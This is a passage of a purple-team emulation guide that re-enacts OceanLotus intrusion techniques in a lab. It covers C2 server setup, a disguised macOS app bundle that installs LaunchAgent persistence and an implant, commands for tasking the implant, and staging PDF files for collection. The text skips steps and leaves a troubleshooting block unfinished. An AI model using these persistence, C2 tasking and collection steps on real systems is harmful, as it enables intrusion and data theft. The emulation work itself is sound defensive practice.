# üåäüíÆ Emulation 
This scenario emulates OceanLotus TTPs based primarily on two malware specimens either 
used by or associated with the OceanLotus actors:

1. [Rota Jakiro](./Resources/OSX.OceanLotus)
1. [OceanLotus.abcdef](./Resources/rota)


### üó∫Ô∏è Legend
This document is intended to be used as a operational guide for a purple team operation. We recommend pausing ~2m after each step to give any detection tools or logs time to caputre the information.

Based on the CTI Emulation Plan, each step includes the following information:
- üìñ **Overview** - Summuary of actions that are completed in this step
- üëæ **Red Team Procedures** - Red team operator instructions & commands to execute with expected output
- üîÆ **Reference Code & Reporting** - A table with links to the source code for specific actions with cited intelligence leveraged for this action (if available)
- üî¨ **Blue Team Notes** - key API calls, events, or telemtry for blue teams

## Step 0 - Operation Setup

### üìñ Overview
This step assumes you have completed the infrastructure [setup](../setup/README.md). At the end of this step a Red Team operator should be able to execute the emulation plan by copying and pasting the commands into the correct terminal window with all required programs running. 

Actions completed in this step:
- Login to the attacker Kali machine via SSH
- Start the control server
- Set up attacker terminal windows for execution
- Login to the macOS VM on AWS - Required for step 1

At the end of this step the Red Team operator's workspace should be set up to run and manage the emulation. This includes a terminal session providing C2 feedback from the listener & a terminal session to task active implants. Assuming the red team operator is executing Step 1, this also includes establishing a VNC session on macOS in the env.

### üëæ Red Team Procedures

#### Kali Setup
Pre-Flight Checks:
- Ensure OceanLotus GitHub repo is cloned to the Kali host (copy/paste commands start at the `ocean-lotus` folder)
- All executables have been built on the correct operating system (i.e. do not compile rota on Kali)
- The C2 server has been configured to the env and built from source with configurations
- All executables used in the operation are in the folders the C2 leverages (i.e. `Payloads` folder)

Assuming you are running on a macOS or Linux host...
Open **four** terminal windows on your local machine (assuming a macOS or similar terminal). Two terminal windows are used for the C2 server, two are used for the AWS macOS instance. 

1. :arrow_right: In the **first** terminal window, ssh to the Kali box hosting our C2 server in AWS
   ```
   ssh kali@10.90.30.26
   ```
   Expected Output:
   A login session as the kali user
   ```
   ‚îå‚îÄ‚îÄ(kali„âøkali1)-[~]
   ‚îî‚îÄ$
   ```
1. Start the C2 Server. Navigate to the `controlServer` folder of the ocean-lotus cloned repo and start the C2 server. 
   ```
   cd ocean-lotus/Resources/controlServer
   ```
   ```
   sudo ./controlServer
   ```
   Expected Output:
   ```
   [INFO] 2023/08/18 16:32:45 Initializing REST API from config file:  ./config/restAPI_config.yml
   [SUCCESS] 2023/08/18 16:32:45 REST API configuration set

   ```
   This window is our listener, communications from implants will display in this window. Leave this window open and set to the side.
1. :arrow_right: In the **second** terminal window, establish a second SSH connection.
   ```
   ssh kali@10.90.30.26
   ```
   Expected Output:
   A login session as the kali user
   ```
   ‚îå‚îÄ‚îÄ(kali„âøkali1)-[~]
   ‚îî‚îÄ$
   ```
1. Navigate to the controlServer folder and leave this window open and accessible. 
   ```
   cd ocean-lotus/Resources/controlServer
   ```
   This is the terminal window we use to task the implant. Unless otherwise specified, all copy/paste command will use this terminal window.
   
<details><summary>Trouble Shooting</summary>
  
   Check Configuration.
   - Check the ip address & port in the config file
   - Recompile the control server with the new IP - In the controlServer folder run the following command.

      ```
      go build -o controlServer main.go
      ```
   
</details>

#### VNC Access to macOS
1. :arrow_right: Navigate to the **thrid** terminal window on your local machine. 
1. Setup SSH Tunnel to forward port 5900 to localhost (must use teh ec2-user for this part).
   ```
   ssh -L 5900:localhost:5900 ec2-user@10.90.30.22
   ```
   The result should be an active SSH session, with port 5900 on the AWS macOS forwarded to port 5900 on your local machine.
   Expected Output: 
   ```
   Last login: <insert date from somewhere>
       ‚îå‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îê   __|  __|_  )
       ‚îÇ ‚ï∑‚ï≠‚ïØ‚ï∑ ‚îÇ   _|  (     /

       ‚îî‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îò  macOS Catalina 10.15.7
   ```
   Leave this window open and move to the side. We will not need to referene this window for the rest of the operation but do need to leave it open until we are finished with the macOS portion.
1. :arrow_right: Navigate to the **fourth**, and last open terminal window on your local machine.
1. Copy/Paste the following command to connect over VNC for a GUI intereface for the macOS machine in AWS.
   ```
   open vnc://localhost:5900
   ```
   A window should appear asking for Screen Sharing privillages to sin into "localhost".
   This terminal window can be closed or terminated after the command is run.   
1. Enter the Hope Potter's credentials
   Username
   ```
   hpotter
   ```
   Password
   ```
   noax3teenohb~e
   ```
   Expected output:
   A GUI interface to the Mac Mini should appear on the screen asking for a password.

1. :arrow_right: Enter the same password from above... manualy. The user's Desktop should appear.
1. Click on the Downloads folder in the Dock located at the base of the Desktop. When the icon expands, select "Open in Finder". A Finder window will open displaying the contents of the Downloads folder.

   >The Dock is the macOS version of a Window's toolbar, Finder is the macOS of Windows Explorer, and the Downloads folder is typically located to the left side of the Trash icon in the Dock.

1. Verify the conkylan.app file (unicorn in Vietnamese) is present in the Downloads folder. 

<details><summary>Trouble Shooting</summary>
  
   If you receive this error...
   ```
   LSOpenURLsWithRole() failed with error -610 for the URL vnc://localhost:5900.
   ```
   
   Try blah.
   ```

## Step 1 - Establish Foothold
### üìñ Overview

üëã Handwaving: Assume the user downloaded a Word document from a legitimate, but compromised, site. The Word docuement (`conkylan.app` - unicorn in Vietnamese) resides on the user's `Downloads` folder. 

**Step 1** emulates OceanLotus gaining initial access via a malicious file [T1204.002](https://attack.mitre.org/techniques/T1204/002/) targeting user `hpotter`. 

Thinking it's a normal Word document, the user, Hope Potter (hpotter), double-clicks the conkylan.app (note: We were not able to disguise the app as a Word document using a homoglyph file extension due to OS updates üôå üçé). The Word document is actually an Application bundle, the first stage payload, which executes the second stage payload, deploys a decoy Word document, and connects to the C2 server.

The first stage payload is an Application bundle that sets up the environment for execution through ensuring the second stage payload (Implant) can be dropped and executed. When opened, the first stage payload uses a bash script to perform the following actions.
   - Removes quarantine flag on files within the application bundle
   - Installs persistence via LaunchAgent
   - Extracts and base64 decodes the embedded Implant (Second Stage) payload and its Communication Library component as `/Users/hpotter/Library/WebKit/com.apple.launchpad` and `/Users/hpotter/Library/WebKit/b2NlYW5sb3R1czIz`, respectively
   - Uses touch to update the timestamps of the Implant (Second Stage) artifacts
   - Uses chmod to make the Implant (Second Stage) binary file executable by changing file permissions to 755
   - Executes the Implant (Second Stage) binary
   - Replaces the application bundle with the decoy Word document
   
The Implant is a fat binary that performs the backdoor capabilities. On execution, the Implant automatically performs the following actions:
   - Collects OS information
   - Registers with C2 server

### üëæ Red Team Procedures

1. Emulate the user double-clicking the conkylan.app (lets pretend it's a Word document)
1. Confirm C2 Registration of the OSX implant 
   In the Listener terminal window you should see the following output...

   ```zsh
      [INFO] 2023/08/18 17:08:13 Received first-time beacon from b6dbd70f203515095d0ca8a5ecbb43f7. Creating session...

   ```
   
1. The macOS implant immediately sends collected discovery information about the victim machine which is printed out in the Listerner terminal window.

   Expected Output:
   ```
      [INFO] 2023/08/18 17:08:13 Initial data received from implant:

      32 GB
      6-Core Intel Core i7
   ```
   
1. The implant will continue to send a `OSX_heartbeat` until tasked.

   Expected Output:
   ```
      [INFO] 2023/08/18 17:17:45 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.

   ```
   
 1. Verify the persistence file was dropped by the initial payloads.
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
   ```
   Expected Output: 
   ```
   [SUCCESS] 2023/08/24 19:21:26 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7

   ```


   <details><summary>Extra Credit - Execute Persistence</summary>
     
      This is not apart of the emulation plan however, if you want to manualy verify the LaunchAgent works you can use `launchctl` to manualy load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon, therefore it would be abnormal for the adversary to arbitrarily execute a LaunchAgent when there is an established session. 
      
      The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
      
      Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
      
      1. Load the LaunchAgent using `launchctl`
         ```
         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
         ````
      1. List out the processes using the com.apple.launchpad plist
         ```
         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
         ```
      1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
         ```
         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
         ```
      
      1. Veify we only have one running process using the com.apple.launchpad plist.
         ```
         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
         ```
      1. Continue hacking...

During our research, we did not find reporting detailing credential collection on macOS. In order to perform lateral movement for the linux portion of our sceario and staying consitent with using native OS utilities seen in other reporting, we choose using to use known_hosts discovery with locally stored SSH keys.

## Step 5 - Collection
### üìñ Overview
Rota Jakiro uses shared objects for code execution. NOTE: There is no public CTI reporting documenting exactly what these shared objects are executing. Therefore, the following code execution is based off general behaviors derived from CTI reporting targeting linux hosts.

Task the implant to upload the shared object (`local_payload_rota.so`) to the target host, the shared object copies and compresses files for collection. 

The following commands are executed by the shared object: 
- Create a hidden tmp.rota folder 
- Starting from the $HOME folder, copy files with a .pdf extension into the tmp.rota folder
- Compress all .pdf files contained in the tmp.rota folder and named `exilf.tar.gz`

Rota Jakiro confirms the target file were created
